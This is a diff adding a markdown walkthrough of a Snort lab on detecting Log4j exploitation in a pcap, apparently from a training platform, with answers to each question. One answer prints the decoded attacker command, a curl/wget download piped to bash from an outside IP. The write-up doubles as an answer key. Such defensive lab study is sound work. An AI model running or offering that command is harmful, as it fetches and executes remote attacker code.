@@ -541,4 +541,114 @@ Let's use external rules to fight against the latest threats! ⚔️
 ## 🎉 Exercise Complete!
 
 
+---
 
+## 🐛 Exercise 8: Using External Rules (Log4j)
+
+Let's use external rules to fight against the latest threats! ⚔️
+
+**Instructions:**
+- Navigate to the task folder.
+- Use the given pcap file for analysis.
+
+---
+
+### 1️⃣ Use the given rule file (local.rules) to investigate the log4j exploitation
+
+**What is the number of detected packets?**
+
+![Log4j Detection](28.png)
+
+**Answer:** `26`
+
+✅ **Correct Answer**
+
+💡 **Hint:** Investigate the log/alarm files.
+
+---
+
+### 2️⃣ How many rules were triggered?
+
+![Rules Triggered](27.png)
+
+**Answer:** `4`
+
+✅ **Correct Answer**
+
+💡 **Hint:** Investigate the log/alarm files.
+
+---
+
+### 3️⃣ What are the first six digits of the triggered rule sids?
+
+![Rule SIDs](27.png)
+
+**Answer:** `210037`
+
+✅ **Correct Answer**
+
+💡 **Hint:** Clear the previous log and alarm files.
+
+---
+
+### 4️⃣ Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes
+
+**What is the number of detected packets?**
+
+![Payload Size Detection](31.png)
+
+**Answer:** `41`
+
+✅ **Correct Answer**
+
+💡 **Hint:** Investigate the log/alarm files.
+
+---
+
+### 5️⃣ What is the name of the used encoding algorithm?
+
+![Encoding Algorithm](29.png)
+
+**Answer:** `Base64`
+
+✅ **Correct Answer**
+
+💡 **Hint:** Investigate the log/alarm files.
+
+---
+
+### 6️⃣ What is the IP ID of the corresponding packet?
+
+![IP ID](30.png)
+
+**Answer:** `62808`
+
+✅ **Correct Answer**
+
+💡 **Hint:** Investigate the log/alarm files.
+
+---
+
+### 7️⃣ Decode the encoded command
+
+**What is the attacker's command?**
+
+![Decoded Command](30.png)
+
+**Answer:** `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`
+
+✅ **Correct Answer**
+
+💡 **Hint:** Decode the Base64 payload to reveal the malicious command.
+
+---
+
+### 8️⃣ What is the CVSS v2 score of the Log4j vulnerability?
+
+**Answer:** `9.3`
+
+✅ **Correct Answer**
+
+---
+
+## 🎉 Exercise Complete!
